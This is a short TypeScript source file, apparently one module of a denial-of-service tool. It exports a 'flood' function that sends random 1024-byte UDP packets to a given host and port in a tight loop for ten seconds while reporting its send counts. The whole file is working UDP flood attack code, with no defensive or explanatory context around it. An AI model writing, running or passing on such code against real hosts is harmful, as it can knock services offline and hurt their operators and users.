import * as dgram from "dgram"
import { randomBytes } from "crypto"

function parseUrl(url: string): { host: string; port: number } {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  return {
    host: u.hostname,
    port: parseInt(u.port) || 80,
  }
}

export async function flood(
  url: string,
  _rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const { host, port } = parseUrl(url)

  return new Promise((resolve) => {
    const sock = dgram.createSocket("udp4")
    const payload = randomBytes(1024)

    const send = () => {
      try {
        sock.send(payload, port, host, () => {
          onStats(1, 1024)
          setImmediate(send)
        })
      } catch {
        sock.close()
        resolve()
      }
    }
    sock.on("error", () => resolve())
    send()
    setTimeout(() => {
      sock.close()
      resolve()
    }, 10000)
  })
}
